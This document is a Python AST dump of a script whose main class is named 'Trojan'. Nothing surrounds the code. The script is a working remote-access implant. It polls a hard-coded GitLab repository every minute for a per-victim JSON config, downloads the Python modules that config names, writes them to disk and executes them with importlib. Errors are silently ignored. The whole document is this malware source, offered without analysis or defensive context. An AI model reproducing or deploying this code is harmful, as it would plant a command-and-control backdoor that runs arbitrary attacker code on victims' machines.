"Module(body=[Import(names=[alias(name='requests'), alias(name='json')]), Import(names=[alias(name='threading'), alias(name='time'), alias(name='os')]), Import(names=[alias(name='importlib.machinery')]), ClassDef(name='Trojan', bases=[], keywords=[], body=[FunctionDef(name='__init__', args=arguments(posonlyargs=[], args=[arg(arg='self'), arg(arg='configUrl'), arg(arg='modulesRepo')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='__stop', ctx=Store())], value=Constant(value=False)), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='__config_url', ctx=Store())], value=Name(id='configUrl', ctx=Load())), Expr(value=Call(func=Attribute(value=Name(id='self', ctx=Load()), attr='__update_config', ctx=Load()), args=[], keywords=[])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='__update_thread', ctx=Store())], value=Call(func=Attribute(value=Name(id='threading', ctx=Load()), attr='Thread', ctx=Load()), args=[], keywords=[keyword(arg='target', value=Attribute(value=Name(id='self', ctx=Load()), attr='__conf_update_loop', ctx=Load()))])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='__loaded_modules', ctx=Store())], value=List(elts=[], ctx=Load())), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='__loader', ctx=Store())], value=Call(func=Name(id='ModuleLoader', ctx=Load()), args=[Name(id='modulesRepo', ctx=Load())], keywords=[])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='__modules_repo', ctx=Store())], value=Name(id='modulesRepo', ctx=Load()))], decorator_list=[]), FunctionDef(name='start', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Expr(value=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='__update_thread', ctx=Load()), attr='start', ctx=Load()), args=[], keywords=[])), While(test=Constant(value=True), body=[For(target=Name(id='mod', ctx=Store()), iter=Subscript(value=Attribute(value=Name(id='self', ctx=Load()), attr='__conf', ctx=Load()), slice=Constant(value='modules'), ctx=Load()), body=[Assign(targets=[Name(id='a', ctx=Store())], value=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='__loader', ctx=Load()), attr='load_module', ctx=Load()), args=[Subscript(value=Name(id='mod', ctx=Load()), slice=Constant(value='name'), ctx=Load())], keywords=[])), If(test=Compare(left=Name(id='a', ctx=Load()), ops=[NotEq()], comparators=[Constant(value=None)]), body=[Expr(value=Call(func=Attribute(value=Name(id='a', ctx=Load()), attr='run', ctx=Load()), args=[], keywords=[]))], orelse=[])], orelse=[]), Expr(value=Call(func=Attribute(value=Name(id='time', ctx=Load()), attr='sleep', ctx=Load()), args=[Constant(value=60)], keywords=[]))], orelse=[])], decorator_list=[]), FunctionDef(name='__conf_update_loop', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[While(test=UnaryOp(op=Not(), operand=Attribute(value=Name(id='self', ctx=Load()), attr='__stop', ctx=Load())), body=[Try(body=[Expr(value=Call(func=Attribute(value=Name(id='self', ctx=Load()), attr='__update_config', ctx=Load()), args=[], keywords=[]))], handlers=[ExceptHandler(body=[Pass()])], orelse=[], finalbody=[]), Expr(value=Call(func=Attribute(value=Name(id='time', ctx=Load()), attr='sleep', ctx=Load()), args=[Constant(value=60)], keywords=[]))], orelse=[])], decorator_list=[]), FunctionDef(name='__update_config', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='resp', ctx=Store())], value=Call(func=Attribute(value=Name(id='requests', ctx=Load()), attr='get', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='__config_url', ctx=Load())], keywords=[])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='__conf', ctx=Store())], value=Call(func=Attribute(value=Name(id='json', ctx=Load()), attr='loads', ctx=Load()), args=[Call(func=Attribute(value=Attribute(value=Name(id='resp', ctx=Load()), attr='content', ctx=Load()), attr='decode', ctx=Load()), args=[Constant(value='utf-8')], keywords=[])], keywords=[])), Pass()], decorator_list=[])], decorator_list=[]), ClassDef(name='ModuleLoader', bases=[], keywords=[], body=[FunctionDef(name='__init__', args=arguments(posonlyargs=[], args=[arg(arg='self'), arg(arg='modulesRepo')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='__modules_repo', ctx=Store())], value=Name(id='modulesRepo', ctx=Load()))], decorator_list=[]), FunctionDef(name='load_module', args=arguments(posonlyargs=[], args=[arg(arg='self'), arg(arg='mod_name')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='mod_path', ctx=Store())], value=BinOp(left=BinOp(left=Constant(value='modules/'), op=Add(), right=Name(id='mod_name', ctx=Load())), op=Add(), right=Constant(value='.py'))), Try(body=[Assign(targets=[Name(id='resp', ctx=Store())], value=Call(func=Attribute(value=Name(id='requests', ctx=Load()), attr='get', ctx=Load()), args=[BinOp(left=BinOp(left=Attribute(value=Name(id='self', ctx=Load()), attr='__modules_repo', ctx=Load()), op=Add(), right=Name(id='mod_name', ctx=Load())), op=Add(), right=Constant(value='.py'))], keywords=[])), If(test=UnaryOp(op=Not(), operand=Call(func=Attribute(value=Attribute(value=Name(id='os', ctx=Load()), attr='path', ctx=Load()), attr='isdir', ctx=Load()), args=[Constant(value='./modules')], keywords=[])), body=[Expr(value=Call(func=Attribute(value=Name(id='os', ctx=Load()), attr='mkdir', ctx=Load()), args=[Constant(value='./modules')], keywords=[]))], orelse=[]), If(test=Call(func=Attribute(value=Attribute(value=Name(id='os', ctx=Load()), attr='path', ctx=Load()), attr='isfile', ctx=Load()), args=[Name(id='mod_path', ctx=Load())], keywords=[]), body=[Expr(value=Call(func=Attribute(value=Name(id='os', ctx=Load()), attr='remove', ctx=Load()), args=[Name(id='mod_path', ctx=Load())], keywords=[]))], orelse=[]), With(items=[withitem(context_expr=Call(func=Name(id='open', ctx=Load()), args=[Name(id='mod_path', ctx=Load()), Constant(value='w')], keywords=[]), optional_vars=Name(id='f', ctx=Store()))], body=[Expr(value=Call(func=Attribute(value=Name(id='f', ctx=Load()), attr='write', ctx=Load()), args=[Call(func=Attribute(value=Attribute(value=Name(id='resp', ctx=Load()), attr='content', ctx=Load()), attr='decode', ctx=Load()), args=[Constant(value='utf-8')], keywords=[])], keywords=[]))])], handlers=[ExceptHandler(type=Name(id='Exception', ctx=Load()), name='e', body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Name(id='e', ctx=Load())], keywords=[])), Return(value=Constant(value=None))])], orelse=[], finalbody=[]), Return(value=Call(func=Attribute(value=Call(func=Attribute(value=Attribute(value=Name(id='importlib', ctx=Load()), attr='machinery', ctx=Load()), attr='SourceFileLoader', ctx=Load()), args=[Name(id='mod_name', ctx=Load()), Name(id='mod_path', ctx=Load())], keywords=[]), attr='load_module', ctx=Load()), args=[], keywords=[]))], decorator_list=[])], decorator_list=[]), FunctionDef(name='main', args=arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='id', ctx=Store())], value=Constant(value='b494b07e-5e27-4073-8db2-f550d60308e4')), Assign(targets=[Name(id='configRepo', ctx=Store())], value=BinOp(left=BinOp(left=Constant(value='https://gitlab.com/threetoes/config-repo/raw/master/config/'), op=Add(), right=Name(id='id', ctx=Load())), op=Add(), right=Constant(value='.json'))), Assign(targets=[Name(id='modulesRepo', ctx=Store())], value=Constant(value='https://gitlab.com/threetoes/config-repo/raw/master/modules/')), Assign(targets=[Name(id='t', ctx=Store())], value=Call(func=Name(id='Trojan', ctx=Load()), args=[Name(id='configRepo', ctx=Load()), Name(id='modulesRepo', ctx=Load())], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='t', ctx=Load()), attr='start', ctx=Load()), args=[], keywords=[]))], decorator_list=[]), If(test=Compare(left=Name(id='__name__', ctx=Load()), ops=[Eq()], comparators=[Constant(value='__main__')]), body=[Expr(value=Call(func=Name(id='main', ctx=Load()), args=[], keywords=[]))], orelse=[])], type_ignores=[])"